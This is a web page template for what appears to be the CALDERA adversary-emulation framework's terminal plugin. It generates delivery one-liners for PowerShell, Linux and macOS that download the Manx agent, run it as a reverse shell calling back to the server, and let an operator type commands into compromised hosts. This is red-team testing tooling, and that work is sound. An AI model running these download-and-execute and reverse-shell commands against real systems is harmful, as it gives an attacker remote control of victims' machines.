<script src="/gui/jquery/jquery.js"></script>
<script src="/gui/js/shared.js"></script>
<script src="/terminal/js/xterm.js"></script>
 <html>
     <head>
         <title>Terminal | Options</title>
         <link rel="shortcut icon" type="image/png" href="/gui/img/favicon.png"/>
         <link rel="stylesheet" href="/gui/css/shared.css">
         <link rel="stylesheet" href="/gui/css/navbar.css">
         <link rel="stylesheet" href="/gui/css/basic.css">
         <link rel="stylesheet" href="/gui/css/modal.css">
         <link rel="stylesheet" href="/terminal/css/basic.css">
         <link rel="stylesheet" href="/terminal/css/xterm.css" />
     </head>
     <body>
     <div class="navbar plugin"></div>
     <center style="margin-bottom: 100px">

         <div id="terminal-commands" class="row-canvas">
            <div class="section-profile">
                <div class="row">
                    <div class="topright duk-icon"><img onclick="openLocalDuk()" src="/gui/img/duk.png"></div>
                    <div class="topleft duk-icon"><img onclick="removeSection('terminal-commands')" src="/gui/img/x.png"></div>

                    <div class="column section-border" style="flex:25%;text-align:left;padding:15px;">
                         <h1 style="font-size:70px;margin-top:-20px;">Terminal</h1>
                         <h2 style="margin-top:-55px">& the Manx agent</h2>
                         <p>
                             The terminal plugin comes with the Manx agent, which communicates to the server over a raw
                             TCP socket. In addition to operating as a normal agent, Manx doubles as a reverse-shell.
                             When you deploy it, you will see sessions <i>pop</i> up below, allowing you to manually
                             interact with the compromised host.
                         </p>
                         <br>
                        <select id="dcommands" onchange="displayCommand()">
                            <option disabled="disabled" selected>Select target OS</option>
                            <option value="darwin">MacOS</option>
                            <option value="linux">Linux</option>
                            <option value="windows-psh">Windows (PowerShell)</option>
                        </select>
                        <br><br>
                        <hr>
                        <br>
                        <p>
                            All commands executed through the reverse-shell emulator (below) are logged into a report.
                            Download it anytime.
                        </p>
                        <button id="reportBtn" type="button" class="button-success atomic-button" onclick="downloadReport('/plugin/terminal/report', 'reverse_report')">Download report</button>
                    </div>
                    <div class="column" style="flex:75%;padding:15px;text-align: left">
                        <div style="background-color: var(--primary-background);padding: 15px;border-radius: 25px">
                            <code id="delivery-command" style="text-align: left;font-size:14px;"></code>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div id="terminal-section" class="row-canvas">
            <div class="section-profile">
                <div class="row">
                     <div class="topright duk-icon"><img onclick="openLocalDuk2()" src="/gui/img/duk.png"></div>
                     <div class="topleft duk-icon"><img onclick="removeSection('terminal-section')" src="/gui/img/x.png"></div>

                     <div class="column" style="flex:100%;padding:15px;text-align: left">
                         <div id="filters">
                            <center>
                                <table class="ability-filter" frame=void rules=rows style="border-spacing:5px;width:100%">
                                <tr>
                                    <td>
                                    <select id="session-id"  onchange="getAbilities()">
                                         <option value="" disabled selected>Select a session</option>
                                         {% for s in sessions %}
                                             <option value="{{ s.id }}" data-paw="{{ s.info }}">{{ s.id }} - {{ s.info }}</option>
                                         {% endfor %}}
                                    </select>
                                    </td>
                                    <td>
                                     <select id="tactic-filter" onchange="filterTechniques()">
                                         <option value="" disabled selected>Select a tactic</option>
                                     </select>
                                    </td>
                                    <td>
                                    <select id="technique-filter" onchange="filterProcedures()">
                                        <option value="" disabled selected>Select a technique</option>
                                    </select>
                                    </td>
                                    <td>
                                    <select id="procedure-filter" onchange="showProcedure()">
                                        <option value="" disabled selected>Select a procedure</option>
                                    </select>
                                    </td>
                                </tr>
                            </table>
                            </center>
                         </div>
                         <br>
                         <div id="xterminal"></div>
                     </div>
                </div>
            </div>
        </div>

         <div id="duk-modal" class="modal">
            <form class="modal-content">
                <div class="container">
                    <div class="row duk-modal">
                        <span onclick="document.getElementById('duk-modal').style.display='none'" class="close" title="Close Modal">&times;</span>
                        <div class="column" style="flex:8%">
                            <img src="/gui/img/duk.png"/>
                        </div>
                        <div class="column" style="flex:92%">
                            <p id="duk-text" style="color: white"></p>
                        </div>
                    </div>
                </div>
             </form>
          </div>

         </center>
     </body>
     <script>
         // talk to server
         let webSocket = location.hostname+':8765';
         let tcpPort = location.hostname+':5678';

         // build terminal emulator
         let prompt = "~$ ";
         let term = new Terminal();
         term.setOption('cursorBlink', true);
         term.open(document.getElementById('xterminal'));
         term.write(prompt);

         // run terminal emulator
         let input = "";
         term.onData(function(data) {
             const code = data.charCodeAt(0);
             if(code === 13) {
                 runCommand(input);
                 input = "";
             } else if (code === 127) {
                // implement backspace
             } else if (code < 32) {
                 return;
             } else {
                 term.write(data);
                 input += data;
             }
         });

         function runCommand(input) {
             let sessionId = $('#session-id option:selected').attr('value');
             let socket = new WebSocket('ws://'+webSocket+'/'+sessionId);
             socket.onopen = function () {
                 socket.send(input);
             };
             socket.onmessage = function (s) {
                 let jData = JSON.parse(s.data);
                 let lines = jData["response"].split('\n');
                 for(let i = 0;i < lines.length;i++){
                    term.write("\r\n"+lines[i]);
                 }
                 prompt = jData["pwd"];
                 term.write("\r\n"+prompt+" ");
             };
         }

         // general helpful functions

         function displayCommand(){
            let selected_option = document.getElementById("dcommands").value;
            let x = $('#delivery-command');
            let http = location.protocol+'//'+location.hostname+(location.port ? ':'+location.port: '');
            if(selected_option === 'windows-psh') {
                x.text('$server="'+http+'"; $socket="0.0.0.0:5678"; $contact="tcp"; $url="$server/file/download"; $wc=New-Object System.Net.WebClient; $wc.Headers.add("platform","windows"); $wc.Headers.add("file","manx.go"); ($data=$wc.DownloadData($url)) -and ($name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","")) -and ([io.file]::WriteAllBytes("C:\\Users\\Public\\$name.exe",$data)) | Out-Null; iex "C:\\Users\\Public\\$name.exe -http $server -socket $socket -contact $contact -v";');
            } else if (selected_option === 'linux') {
                x.text('server="'+http+'";socket="'+tcpPort+'";contact="tcp";agent=$(curl -svkOJ -X POST -H "file:manx.go" -H "platform:linux" $server/file/download 2>&1 | grep -i "Content-Disposition" | grep -io "filename=.*" | cut -d\'=\' -f2 | tr -d \'"\\r\') && chmod +x $agent 2>/dev/null && ./$agent -http $server -socket $socket -contact $contact -v;');
            } else if (selected_option === 'darwin') {
                x.text('server="'+http+'";socket="'+tcpPort+'";contact="tcp";agent=$(curl -svkOJ -X POST -H "file:manx.go" -H "platform:darwin" $server/file/download 2>&1 | grep -i "Content-Disposition" | grep -io "filename=.*" | cut -d\'=\' -f2 | tr -d \'"\\r\') && chmod +x $agent 2>/dev/null && ./$agent -http $server -socket $socket -contact $contact -v;');
            }
            $('#copyCommand').show();
         }

         function openLocalDuk() {
             document.getElementById("duk-modal").style.display="block";
            $('#duk-text').text('Did you know... you can also deploy a new reverse-shell by running an operation using ' +
                'the terminal adversary. Make sure you also use the terminal facts, which contain the location of the ' +
                'TCP socket. You will need to update this value if you are running anywhere but localhost.');
         }

         function openLocalDuk2() {
             document.getElementById("duk-modal").style.display="block";
            $('#duk-text').text('Did you know... there are a handful of special commands you can run in a session. ' +
                'Check the documentation for a full list.');
         }

         function removeSection(identifier){
             $('#'+identifier).hide();
         }

         // ability filter options

         let ABILITIES = [];
         function getAbilities() {
             function getAbilitiesCallback(data){
                $('#tactic-filter').empty().append("<option disabled='disabled' selected>Choose a tactic</option>");
                 ABILITIES = [];
                 let found = [];
                 data.abilities.forEach(function(ability) {
                     ABILITIES.push(ability);
                     if(!found.includes(ability.tactic)) {
                         $('#tactic-filter').append('<option value="'+ability.tactic+'">'+ability.tactic+'</option>');
                         found.push(ability.tactic);
                     }
                 });
             }
             restRequest('POST', {"paw": $('#session-id option:selected').data('paw')}, getAbilitiesCallback, '/ability');
         }
         function filterTechniques() {
             let found = [];
             $('#technique-filter').empty().append("<option disabled='disabled' selected>Choose a technique</option>");
             ABILITIES.forEach(function(ability){
                 if(ability.tactic === $('#tactic-filter').val() && !found.includes(ability.technique_id)) {
                     $('#technique-filter').append('<option value="'+ability.technique_id+'">'+ability.technique_id+' | '+ability.technique_name+'</option>');
                     found.push(ability.technique_id);
                 }
             });
         }
         function filterProcedures() {
             $('#procedure-filter').empty().append("<option disabled='disabled' selected>Choose a procedure</option>");
             ABILITIES.forEach(function(ability){
                 if(ability.tactic === $('#tactic-filter').val() && ability.technique_id === $('#technique-filter').val()) {
                     $('#procedure-filter').append('<option value="'+ability.ability_id+'">'+ability.name+'</option>');
                 }
             });            
         }
         function showProcedure() {
             ABILITIES.forEach(function(ability){
                 if(ability.ability_id === $('#procedure-filter').val()) {
                     term.write(atob(ability.test));
                     input = atob(ability.test);
                     return;
                 }
             });
         }
     </script>
 </html>